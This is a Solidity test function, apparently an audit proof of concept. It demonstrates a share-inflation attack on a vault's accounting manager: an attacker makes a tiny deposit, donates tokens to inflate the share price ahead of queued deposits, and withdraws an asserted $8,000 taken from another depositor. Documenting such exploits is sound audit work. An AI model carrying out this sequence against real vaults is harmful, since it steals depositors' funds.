function testInflationAttack() public {
    _dealWhale(baseToken, address(alice), address(0x1AB4973a48dc892Cd9971ECE8e01DcC7688f8F23), 100_000e6);
    _dealWhale(baseToken, address(bob), address(0x1AB4973a48dc892Cd9971ECE8e01DcC7688f8F23), 20_000e6);

    uint256 attackerBalanceBefore = IERC20(baseToken).balanceOf(alice);

    // The attacker deposits for 9 shares
    vm.startPrank(alice);
    SafeERC20.forceApprove(IERC20(USDC), address(accountingManager), 9);
    accountingManager.deposit(address(alice), 9, address(0));

    // The attacker's deposit is processed
    vm.startPrank(owner);
    accountingManager.calculateDepositShares(10);
    vm.warp(block.timestamp + 30 minutes);
    accountingManager.executeDeposit(10, connector, "");

    // Users later add two (or more) deposits to the queue
    vm.startPrank(bob);
    SafeERC20.forceApprove(IERC20(USDC), address(accountingManager), 20_000e6);
    accountingManager.deposit(address(bob), 10_000e6, address(0));
    accountingManager.deposit(address(bob), 10_000e6, address(0));

    // The attacker inflates the price before the deposits are processed
    vm.startPrank(alice);
    IERC20(baseToken).transfer(address(accountingManager), 100_000e6 - 9);

    // Deposits are processed
    vm.startPrank(owner);
    accountingManager.calculateDepositShares(10);
    vm.warp(block.timestamp + 30 minutes);
    accountingManager.executeDeposit(10, connector, "");

    // The attacker has made a profit of $8000
    uint256 redeemable = accountingManager.previewRedeem(9);
    assertEq(redeemable - attackerBalanceBefore, 8000e6);

    // Withdraw the profit
    vm.startPrank(alice);
    accountingManager.withdraw(9, address(alice));

    vm.startPrank(owner);
    accountingManager.calculateWithdrawShares(10);

    vm.warp(block.timestamp + 6 hours);

    accountingManager.startCurrentWithdrawGroup();

    uint256 needed = accountingManager.neededAssetsForWithdraw();
    RetrieveData[] memory retrieveData = new RetrieveData[](1);
    retrieveData[0] = RetrieveData(needed, address(connector), abi.encode(needed, ""));
    accountingManager.retrieveTokensForWithdraw(retrieveData);

    accountingManager.fulfillCurrentWithdrawGroup();

    accountingManager.executeWithdraw(10);

    // The $8000 profit is realized
    assertEq(IERC20(baseToken).balanceOf(alice) - attackerBalanceBefore, 8000e6);

    // No shares left
    assertEq(accountingManager.totalSupply(), 0);
}

